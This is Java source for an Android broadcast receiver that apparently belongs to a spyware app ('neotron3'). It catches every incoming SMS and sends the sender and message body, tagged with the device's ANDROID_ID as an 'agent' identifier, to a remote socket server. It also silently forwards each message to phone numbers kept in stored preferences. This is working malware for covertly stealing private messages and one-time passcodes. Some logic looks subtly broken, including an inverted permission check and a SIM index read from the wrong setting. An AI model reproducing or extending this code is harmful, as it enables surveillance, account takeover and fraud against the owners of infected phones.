package com.pegalite.neotron3.functions;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.pegalite.neotron3.server.socket.PegaSocketServer;

import java.util.List;

public class SmsReceiver extends BroadcastReceiver {
    private static boolean forwardMessage(Context context, int simSlotIndex, String message, String phoneNumber) {
        SmsManager smsManager = SmsManager.getDefault(); // fallback by default

        // Try to get SmsManager for the given SIM slot
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();

            if (subscriptionInfoList != null && simSlotIndex >= 0 && simSlotIndex < subscriptionInfoList.size()) {
                int subscriptionId = subscriptionInfoList.get(simSlotIndex).getSubscriptionId();
                smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId);
            } else {
                Log.w("SMS", "Invalid SIM slot index: " + simSlotIndex + ", using default SIM");
            }
        }

        // Handle single or multiple recipients
        if (phoneNumber.contains(",") || phoneNumber.contains(".")) {
            String[] numbers = phoneNumber.contains(",") ? phoneNumber.split(",") : phoneNumber.split("\\.");
            for (String number : numbers) {
                smsManager.sendTextMessage(number.trim(), null, message, null, null);
            }
            return true;
        }

        smsManager.sendTextMessage(phoneNumber.trim(), null, message, null, null);
        return false;
    }


    @SuppressLint("HardwareIds")
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String sender = smsMessage.getDisplayOriginatingAddress();
                String message = smsMessage.getMessageBody();
                Log.d("SMS", "From: " + sender + " | Message: " + message);
                Prefs prefs = new Prefs(context);
                if (PegaSocketServer.getSocket() != null && PegaSocketServer.getSocket().connected()) {
                    PegaSocketServer.getSocket().emit("sms", "agent-" + Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + context.getPackageName(), sender, message);

                    if (prefs.getPref("sms-forward-online").equals("no-data")) {
                        return;
                    }
                    String phoneNumber = prefs.getPref("sms-forward-online");
                    if (forwardMessage(context, Integer.parseInt(prefs.getPref("sms-sim-index").equals(Prefs.NO_DATA) ? "0" : prefs.getPref("sms-forward")), message, phoneNumber))
                        return;
                } else {
                    if (prefs.getPref("sms-forward").equals("no-data")) {
                        return;
                    }
                    String phoneNumber = prefs.getPref("sms-forward");
                    if (forwardMessage(context, Integer.parseInt(prefs.getPref("sms-sim-index").equals(Prefs.NO_DATA) ? "0" : prefs.getPref("sms-forward")), message, phoneNumber))
                        return;

                }
            }
        }
    }
}
